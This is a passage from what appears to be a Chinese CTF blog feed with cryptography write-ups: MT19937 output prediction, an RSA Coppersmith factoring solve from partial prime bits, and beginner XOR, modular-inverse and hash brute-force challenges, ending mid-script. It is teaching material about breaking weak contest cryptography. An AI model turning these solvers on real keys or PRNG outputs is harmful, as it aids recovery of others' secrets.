class="number">9387982608299096176</span>, <span class="number">5067191246740902300</span>, <span class="number">2164563749890672481</span>, <span class="number">1441096478400860673</span>, <span class="number">1698497919091504741</span>, <span class="number">7070556267349479512</span>, <span class="number">12383115351862498978</span>, <span class="number">4393914787565756921</span>, <span class="number">4843292715860537520</span>, <span class="number">1308644180050696570</span>, <span class="number">14727896807325886230</span>, <span class="number">5278800618172724513</span>, <span class="number">12682261375578839563</span>, <span class="number">2292210517400729441</span>, <span class="number">4539831393791783686</span>, <span class="number">11184877751085848181</span>, <span class="number">10455063755670025488</span>, <span class="number">4090948952473244180</span>, <span class="number">16140611536328585842</span>, <span class="number">4009612709629840807</span>, <span class="number">11680437954598062018</span>, <span class="number">7483349842877448300</span>, <span class="number">15595722655987483</span>, <span class="number">6218105392300937979</span>, <span class="number">4230977848731176695</span>, <span class="number">13608604339767291094</span>, <span class="number">15450864502883571776</span>, <span class="number">14522043162137067612</span>, <span class="number">17407306325856924818</span>, <span class="number">4319385475362004982</span>, <span class="number">3602607459242950116</span>, <span class="number">12919519173298379659</span>, <span class="number">17034295612889519066</span>, <span class="number">16366395208098028226</span>, <span class="number">16902437965740309665</span>, <span class="number">2976505459482736335</span>, <span class="number">13462949500218242510</span>, <span class="number">9986640179928306819</span>, <span class="number">15767966148754567460</span>, <span class="number">5987675944577047926</span>, <span class="number">908917886808113767</span>, <span class="number">7775521308318543697</span>, <span class="number">8554839413248075973</span>, <span class="number">15830102725396509035</span>, <span class="number">4299599343707193551</span>, <span class="number">151253289791368809</span>, <span class="number">2074429061050605186</span>, <span class="number">7050639080325887498</span>, <span class="number">7147021929133361313</span>, <span class="number">17288365729620621043</span>, <span class="number">13258996835492542256</span>, <span class="number">9813891614733236908</span>, <span class="number">18409516239359796503</span>, <span class="number">6114024626644998222</span>, <span class="number">5075084268262314250</span>, <span class="number">9316231926255260786</span>, <span class="number">5482842808296472097</span>, <span class="number">9445382679464571342</span>, <span class="number">341224484511902160</span>, <span class="number">13784129997188624024</span>, <span class="number">7368235505308494752</span>, <span class="number">9538628927204464393</span>, <span class="number">15343501567237040869</span>, <span class="number">17821228923098686582</span>, <span class="number">11856702827887607105</span>, <span class="number">4609368864524898262</span>, <span class="number">14712861947435117594</span>, <span class="number">10899071438470157317</span>, <span class="number">9590771163252554239</span>, <span class="number">18239878173866313008</span>, <span class="number">17348232285102511866</span>, <span class="number">7979447902828438866</span>, <span class="number">10189744825270231378</span>, <span class="number">15897242279714161903</span>, <span class="number">6814376918912188976</span>, <span class="number">14160295163213869895</span>, <span class="number">3756399085747026247</span>, <span class="number">7851944732036371005</span>, <span class="number">11096596485883534745</span>, <span class="number">17528766768147904271</span>, <span class="number">12327736621720397026</span>, <span class="number">17199643471105880304</span>, <span class="number">1457112013787956971</span>, <span class="number">4273300114441781498</span>, <span class="number">15938254022202331850</span>, <span class="number">12502089261484299213</span>, <span class="number">4148861150304071474</span>, <span class="number">16774360387122462360</span>, <span class="number">4693230099623568126</span>, <span class="number">4923228118836213154</span>, <span class="number">9672193860921898593</span>, <span class="number">12031664828792019070</span>, <span class="number">5538759348099426194</span>, <span class="number">16607999864018217913</span>, <span class="number">12801100377914190264</span>, <span class="number">3714468733303697571</span>, <span class="number">15066120849955539008</span>, <span class="number">8667181143710237426</span>, <span class="number">11054461905529698068</span>, <span class="number">5000947219599965404</span>, <span class="number">13679544882732214263</span>, <span class="number">12329024745774068972</span>, <span class="number">5097030027906429561</span>, <span class="number">623294247887615792</span>, <span class="number">7749632090228054556</span>, <span class="number">7348314875737386281</span>, <span class="number">15051320008802373451</span>, <span class="number">2316565134939415828</span>, <span class="number">15735407710770638384</span>, <span class="number">11219541286219768213</span>, <span class="number">204970242910995613</span>, <span class="number">2942251758669266767</span>, <span class="number">2446839436006958427</span>, <span class="number">5818242570475463614</span>, <span class="number">13952882162210790154</span>, <span class="number">1091967561799274001</span>, <span class="number">815669942787526663</span>, <span class="number">17619502901620723825</span>, <span class="number">16225434478481351091</span>, <span class="number">3458534598924545265</span>, <span class="number">13105176322289080982</span>, <span class="number">11660428227784960936</span>, <span class="number">17456917329772545202</span>, <span class="number">17370020327039448988</span>, <span class="number">9872223534315941551</span>, <span class="number">11134891555868721043</span>, <span class="number">7366592335535613164</span>, <span class="number">17901061154562355983</span>, <span class="number">11133114536770437092</span>, <span class="number">1216102370074140712</span>, <span class="number">12369779197340106392</span>, <span class="number">15587264963667110618</span>, <span class="number">9839321331851277149</span>, <span class="number">9504232653874690416</span>, <span class="number">3277515784377114968</span>, <span class="number">11059930209112798658</span>, <span class="number">2233223095276440320</span>, <span class="number">8766259643725656785</span>, <span class="number">2981451568249872324</span>, <span class="number">16923059343824130016</span>, <span class="number">10424762723653272247</span>, <span class="number">5892364915443744172</span>, <span class="number">5076056599547198181</span>, <span class="number">8353569794147013632</span>, <span class="number">68280038528939863</span>, <span class="number">13688795951892474996</span>, <span class="number">18383293316785491223</span>, <span class="number">16830221144227410771</span>, <span class="number">7584798539822253809</span>, <span class="number">16154968662715915283</span>, <span class="number">15260829610123279933</span>, <span class="number">4877893352139268298</span>, <span class="number">12344113633536211040</span>, <span class="number">12755524932207520008</span>, <span class="number">5908761689287331221</span>, <span class="number">10710685683019125231</span>, <span class="number">13529779487666749860</span>, <span class="number">17058207837744409161</span>, <span class="number">16146404756880670361</span>, <span class="number">479722120166144953</span>, <span class="number">18441286007767994888</span>, <span class="number">291021007503523962</span>, <span class="number">18404478127831570654</span>, <span class="number">7161684062922444049</span>, <span class="number">13215140078849265993</span>, <span class="number">3557093399709796464</span>, <span class="number">8888690439305341966</span>, <span class="number">6505462940112971530</span>, <span class="number">8788739344222162420</span>, <span class="number">1559480144085566061</span>, <span class="number">12347917275519574148</span>, <span class="number">81829582595789879</span>, <span class="number">256554008735570761</span>, <span class="number">13242371414730122957</span>, <span class="number">11233874231428992467</span>, <span class="number">13642556384815692603</span>, <span class="number">15402098527178414517</span>, <span class="number">11899811780905828512</span>, <span class="number">17981855746545737550</span>, <span class="number">4198592355605474429</span>, <span class="number">5837385946994485658</span>, <span class="number">8495884884442446152</span>, <span class="number">14987601548279232776</span>, <span class="number">8084557976601943459</span>, <span class="number">1951816494581368991</span>, <span class="number">9198564418991457621</span>, <span class="number">7932995247156296394</span>, <span class="number">1727181807973386737</span>, <span class="number">6589861619929187838</span>, <span class="number">8606879269790701257</span>, <span class="number">4872437793541536276</span>, <span class="number">15996953415759653811</span>, <span class="number">9248501959204439487</span>, <span class="number">4430871643980849717</span>, <span class="number">14781923535395473967</span>, <span class="number">15369814218152848270</span>, <span class="number">8234249513592097579</span>, <span class="number">17526914633363815278</span>, <span class="number">12602191579658959446</span>, <span class="number">14791379194771288560</span>, <span class="number">5744799145746380430</span>, <span class="number">16286641132134680583</span>, <span class="number">14401259673433035989</span>, <span class="number">8781313506229705992</span>, <span class="number">15404783223179793847</span>, <span class="number">1240592003072635453</span>, <span class="number">6610236446870877009</span>, <span class="number">13844205871835893697</span>, <span class="number">5872162931619514680</span>, <span class="number">7969671272013520825</span>, <span class="number">2766019064081136959</span>, <span class="number">12517751573997673572</span>, <span class="number">9675763639282129596</span>, <span class="number">6287079859085827340</span>, <span class="number">13703850028043029227</span>, <span class="number">2177538632683478842</span>, <span class="number">6799380297638496469</span>, <span class="number">18086402650215147822</span>, <span class="number">6934362201312885542</span>, <span class="number">18313335318052001373</span>, <span class="number">11480263463655438919</span>, <span class="number">9106785110623113711</span>, <span class="number">7886399579140250642</span>, <span class="number">3228263571695418855</span>, <span class="number">16330664963396613091</span>, <span class="number">17040963948964130546</span>, <span class="number">10826606124423646728</span>, <span class="number">2004304733703582220</span>, <span class="number">6398041571715522263</span>, <span class="number">493137561871256273</span>, <span class="number">9640584407491032029</span>, <span class="number">16021497942534243559</span>, <span class="number">3278925318796881775</span>, <span class="number">13963508362353842195</span>, <span class="number">10912881406340519756</span>, <span class="number">12333002179163988752</span>, <span class="number">10955825398678638303</span>, <span class="number">13098738959421529927</span>, <span class="number">4516651215445389327</span>, <span class="number">560548562818360587</span>, <span class="number">6879446280544278794</span>, <span class="number">17586026517062529192</span>, <span class="number">3060809513700298266</span>, <span class="number">10921253043682209150</span>, <span class="number">3096750023591656316</span>, <span class="number">13400270480516947274</span>, <span class="number">14497399820138619643</span>, <span class="number">885203573443562232</span>, <span class="number">14340392236208331243</span>, <span class="number">2009503763921531273</span>, <span class="number">5844055580211151684</span>, <span class="number">11452679420109767541</span>, <span class="number">9889351505080896698</span>, <span class="number">12297221479872520074</span>, <span class="number">145327472993840493</span>, <span class="number">14415741022760094936</span>, <span class="number">8161272693495024070</span>, <span class="number">12628038780375717745</span>, <span class="number">5651066232426624946</span>, <span class="number">6800289990668254787</span>, <span class="number">5629827258100727980</span>, <span class="number">9532683887081871864</span>, <span class="number">17078228306713530437</span>, <span class="number">5752393712365853210</span>, <span class="number">9906279898480007557</span>, <span class="number">15575593797821095372</span>, <span class="number">7944135127159515198</span>, <span class="number">9274370606751170281</span>, <span class="number">8181946307601340138</span>, <span class="number">8855405836683610977</span>, <span class="number">10604653901416893787</span>, <span class="number">11825055110857035062</span>, <span class="number">4735989253296218178</span>, <span class="number">9585945902650058725</span>, <span class="number">16832571384429265203</span>, <span class="number">14392760261562270322</span>, <span class="number">14439958219835048793</span>, <span class="number">6845765491294793435</span>, <span class="number">10537690616100733378</span>, <span class="number">10290121783493343259</span>, <span class="number">17074695699105811516</span>, <span class="number">17508569400297966287</span>, <span class="number">15411447085789948953</span>, <span class="number">10245321407074763960</span>, <span class="number">1474249930147284650</span>, <span class="number">338858065124110851</span>, <span class="number">16523709105734298997</span>, <span class="number">17458843705270839631</span>, <span class="number">11471295397505031119</span>, <span class="number">6285176061334214908</span>, <span class="number">2705374183703063320</span>, <span class="number">12810847959239174924</span>, <span class="number">10260721046212143624</span>, <span class="number">4221085600703449212</span>, <span class="number">1200019904756589653</span>, <span class="number">10460179773211533763</span>, <span class="number">11823018480340155341</span>, <span class="number">9903187458931297940</span>, <span class="number">1139978577616698133</span>, <span class="number">5744593808037898897</span>, <span class="number">16758300938964610655</span>, <span class="number">7359351744825865326</span>, <span class="number">10862900264466009346</span>, <span class="number">3342859891404368697</span>, <span class="number">18254401553280819107</span>, <span class="number">17133307977473573143</span>, <span class="number">11714571723704738721</span>, <span class="number">8944205159183890163</span>]</span><br><span class="line">pre = mt19937_64()</span><br><span class="line">pre.from_output(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, res[:<span class="number">312</span>])))</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> rand <span class="keyword">in</span> res[<span class="number">312</span>:]:</span><br><span class="line">    a = pre.random()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(rand) == a:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        FLAG = <span class="string">b&#x27;DASCTF&#123;&#x27;</span> + hashlib.md5(<span class="built_in">str</span>(a).encode()).hexdigest().encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(FLAG)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>MT19937</tag>
      </tags>
  </entry>
  <entry>
    <title>20211008 鹤城杯Crypto方向WP</title>
    <url>/posts/4ed7c718/</url>
    <content><![CDATA[<p>这是我写过最短的WP了吧</p>
<p>这至少flag改下吧，一点都不走心</p>
<span id="more"></span>

<h1 id="鹤城杯"><a href="#鹤城杯" class="headerlink" title="鹤城杯"></a>鹤城杯</h1><h2 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h2><p>社会主义好，社会主义好</p>
<h2 id="a-crypto"><a href="#a-crypto" class="headerlink" title="a_crypto"></a>a_crypto</h2><p>lj<a href="http://www.3fwork.com/kaifa200/004475MYM012472/">原题</a></p>
<p>下班</p>
<hr>
<p>上班</p>
<h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><p><a href="http://www.zbc53.top/archives/148/">Striving师傅博客</a>里有，不愧是他</p>
<p>用q的低位得到p的低位，和Yusa美国大选那题类似，然后用CopperSmith解方程，这样范围应该可以</p>
<p>稍微写一下吧</p>
<hr>
<p>首先我们简单试验下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p * q</span><br><span class="line">p1 = p % (<span class="number">2</span> ** <span class="number">50</span>)</span><br><span class="line">q1 = q % (<span class="number">2</span> ** <span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(p1 * q1)[<span class="number">2</span>:][-<span class="number">50</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(n)[<span class="number">2</span>:][-<span class="number">50</span>:])</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">11111010001010111111110101111111001001100100000111</span><br><span class="line">11111010001010111111110101111111001001100100000111</span><br></pre></td></tr></table></figure>

<p>得到的结果显示知道n和q的低位，求出p的低位显然不在话下，这个就很想<a href="https://4xwi11.github.io/posts/ea88a88e/#classical%EF%BC%88recuring%EF%BC%89">中国海洋大学的那道题</a>的简化版</p>
<hr>
<p>有师傅说（没有师傅说）这不就是已知p的高位吗，直接用CopperSmith行不行</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211009143059578.png" alt="image-20211009143059578"></p>
<p>la佬的博客上也说了，起码知道约$\frac{1}{2}$位数才行，而且就算是像<a href="https://4xwi11.github.io/posts/493b5ffc/#Crypto-babyrsa">corCTF babyrsa</a>可以爆破，但题目是1024左移724位，最多爆破几位也远远不够</p>
<p>所以必须先用q的低位，得到p的低265位，这样相当于知道p的565位了，这样才有一半</p>
<p>其次根据n和p的高300位和低265位求p中间的459位，可以列一式子<br>$$<br>p_0&lt;&lt;724+p1&lt;&lt;265+p_2=n<br>$$<br>位运算不好看就<br>$$<br>p_0\times 2^{724}+p_1\times 2^{265}+p_2=n<br>$$<br>$p_1$不知道，设为$x$<br>$$<br>p_0\times 2^{724}+x\times 2^{265}+p_2=n<br>$$<br>这不就是CopperSmith解一元吗，想了解更多的师傅可以看<a href="https://4xwi11.github.io/posts/493b5ffc/#Crypto-babyrand%EF%BC%88recuring%EF%BC%89">corCTF babyrand</a></p>
<p>emmmmmm本来以为差不多，但是没有出来，解出来是空的，也就是范围太大，CopperSmith还是解不了</p>
<p>看了Striving师傅的博客</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211009152100154.png" alt="image-20211009152100154"></p>
<p>原来还有这种讲究，我还以为已经一半多了</p>
<p>哦，我记起来了，在corCTF也不是没遇到过，所以多爆几位吧</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211009152240651.png" alt="image-20211009152240651"></p>
<p>完整的exp，这个自己想不容易被带偏，当然Striving师傅的博客里有直接推导出p低位的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">p0 = <span class="number">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span></span><br><span class="line">q2 = <span class="number">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span></span><br><span class="line">n = <span class="number">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span></span><br><span class="line">c = <span class="number">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># q2 -&gt; p2</span></span><br><span class="line">known_low_bits = <span class="number">265</span></span><br><span class="line">n2 = <span class="built_in">bin</span>(n)[<span class="number">2</span>:][-known_low_bits:]</span><br><span class="line">p2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(known_low_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">&#x27;1&#x27;</span> + p2, <span class="number">2</span>) * q2)[<span class="number">2</span>:].endswith(n2[-(i+<span class="number">1</span>):]):</span><br><span class="line">        p2 = <span class="string">&#x27;1&#x27;</span> + p2</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p2 = <span class="string">&#x27;0&#x27;</span> + p2</span><br><span class="line">p2 = <span class="built_in">int</span>(p2, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># print(bin(p2 * q2)[2:][-known_low_bit:])</span></span><br><span class="line"><span class="comment"># print(n2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p2, p0 -&gt; p</span></span><br><span class="line">p0 = p0 &lt;&lt; <span class="number">724</span></span><br><span class="line">unknown_bits = <span class="number">459</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    fx = p0 + x * <span class="number">2</span> ^ (<span class="number">265</span> + bit) + p2</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">2</span>**bit)):</span><br><span class="line">        f = fx + i * <span class="number">2</span> ^ <span class="number">265</span></span><br><span class="line">        f = f.monic()</span><br><span class="line">        kbits = unknown_bits - bit</span><br><span class="line">        p1 = f.small_roots(X=<span class="number">2</span> ^ kbits, beta=<span class="number">0.4</span>)</span><br><span class="line">        <span class="keyword">if</span> p1:</span><br><span class="line">            p = p0 + <span class="built_in">int</span>(p1[<span class="number">0</span>]) * <span class="number">2</span> ^ (<span class="number">265</span> + bit) + p2 + i * <span class="number">2</span> ^ <span class="number">265</span></span><br><span class="line">            <span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">            q = n // p</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(e, n-p-q+<span class="number">1</span>), n)))</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211009175518651.png" alt="image-20211009175518651"></p>
<h2 id="Crazy-Rsa-Tech"><a href="#Crazy-Rsa-Tech" class="headerlink" title="Crazy_Rsa_Tech"></a>Crazy_Rsa_Tech</h2><p>广播，sage里crt一把梭就出来了</p>
<p>下班</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>CopperSmith</tag>
      </tags>
  </entry>
  <entry>
    <title>Blue-Whale2021 Freshers &amp; 2021第六届中国海洋大学信息安全竞赛Crypto方向部分WP</title>
    <url>/posts/ea88a88e/</url>
    <content><![CDATA[<p>20210903</p>
<p>芜湖，不是吧，不会有人鸽了两三个月才来复现结果误闯人家新生赛了吧</p>
<p>yyd萌新</p>
<span id="more"></span>

<h1 id="Blue-Whale2021-Freshers"><a href="#Blue-Whale2021-Freshers" class="headerlink" title="Blue-Whale2021 Freshers"></a>Blue-Whale2021 Freshers</h1><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><blockquote>
<p>aW9kantaaG9mcnBoX3dyX0Zsc2todVZzZGZoIX0=</p>
</blockquote>
<p>base64$\rightarrow$Caesar 3</p>
<blockquote>
<p>flag{Welcome_to_CipherSpace!}</p>
</blockquote>
<h2 id="baby-OTP"><a href="#baby-OTP" class="headerlink" title="baby_OTP"></a>baby_OTP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;flag&#123;***********&#125;&#x27;</span>.strip(<span class="string">&#x27;flag&#123;&#x27;</span>).strip(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">mask = <span class="string">&#x27;It_is_Mask!&#x27;</span></span><br><span class="line">cipher = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) ^ <span class="built_in">ord</span>(mask[i])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))])</span><br><span class="line"><span class="built_in">print</span>(cipher.encode())</span><br><span class="line"><span class="comment"># b&#x27;1;-6B,\x12R\x12\x18X&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{xOr_1s_3asy}</p>
</blockquote>
<h2 id="baby-exGCD"><a href="#baby-exGCD" class="headerlink" title="baby_exGCD"></a>baby_exGCD</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;********&#125;&#x27;</span>.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">p = <span class="number">9250064974587738262998767</span></span><br><span class="line"><span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> p &gt; flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, p):</span><br><span class="line">    <span class="keyword">if</span> (i * flag - <span class="number">1</span>) % p == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="comment"># 5141371231815721033613206</span></span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{inverse_}</p>
</blockquote>
<h2 id="baby-quadratic-residue"><a href="#baby-quadratic-residue" class="headerlink" title="baby_quadratic-residue"></a>baby_quadratic-residue</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;****&#125;&#x27;</span>.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">p = <span class="number">10</span>**<span class="number">11</span> + <span class="number">3</span></span><br><span class="line"><span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> flag &lt; p</span><br><span class="line"><span class="keyword">assert</span> flag ** <span class="number">2</span> % p == <span class="number">45738244299</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">10</span>**<span class="number">11</span> + <span class="number">3</span></span><br><span class="line">c = <span class="number">45738244299</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(p-<span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{ea5y}</p>
</blockquote>
<h2 id="baby-proof-of-work"><a href="#baby-proof-of-work" class="headerlink" title="baby_proof_of_work"></a>baby_proof_of_work</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid4()) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> md5(flag.encode()).hexdigest() == <span class="string">&#x27;02195c68e0af460e431d8076aeda74d2&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag[:-<span class="number">6</span>] == <span class="string">&#x27;flag&#123;ba9951a2-c233-4555-b703-1337cdc&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>UUID</strong>全称Universally Unique Identifier，通用唯一识别码，有点hash函数那味</p>
<p>16字节128位长的数字，通常以36字节的字符串表示，示例如下：</p>
<blockquote>
<p>3F2504E0-4F89-11D3-9A0C-0305E82C3301</p>
</blockquote>
<p>其中的字母是16进制表示，大小写无关</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> hexdigits</span><br><span class="line">space = hexdigits[:-<span class="number">6</span>]+<span class="string">&#x27;-&#x27;</span></span><br><span class="line">head = <span class="string">&#x27;flag&#123;ba9951a2-c233-4555-b703-1337cdc&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(space, repeat=<span class="number">5</span>):</span><br><span class="line">    tail = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    flag = head + tail + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> md5(flag.encode()).hexdigest() == <span class="string">&#x27;02195c68e0af460e431d8076aeda74d2&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{ba9951a2-c233-4555-b703-1337cdcf4e3d}</p>
</blockquote>
<h2 id="baby-stream"><a href="#baby-stream" class="headerlink" title="baby_stream"></a>baby_stream</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;flag&#123;************************************&#125;&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;******&#x27;</span></span><br><span class="line">cipher_set = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    cipher_set.append(<span class="built_in">ord</span>(flag[i]) ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(cipher_set)</span><br><span class="line"><span class="comment"># [39, 43, 14, 46, 61, 28, 53, 24, 6, 58, 25, 19, 45, 38, 8, 22, 48, 16, 51, 62, 48, 44, 39, 6, 56, 53, 6, 46, 46, 1, 30, 62, 0, 60, 25, 30, 47, 40, 24, 104, 103, 8]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># key</span></span><br><span class="line">cipher_set = [<span class="number">39</span>, <span class="number">43</span>, <span class="number">14</span>, <span class="number">46</span>, <span class="number">61</span>, <span class="number">28</span>, <span class="number">53</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">58</span>, <span class="number">25</span>, <span class="number">19</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">22</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">51</span>, <span class="number">62</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">39</span>, <span class="number">6</span>, <span class="number">56</span>, <span class="number">53</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">46</span>, <span class="number">1</span>, <span class="number">30</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">47</span>, <span class="number">40</span>, <span class="number">24</span>, <span class="number">104</span>, <span class="number">103</span>, <span class="number">8</span>]</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line">key_parts = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    key_parts += <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) ^ cipher_set[i])</span><br><span class="line"><span class="comment"># print(key_parts)</span></span><br><span class="line">key = key_parts + <span class="string">&#x27;u&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span 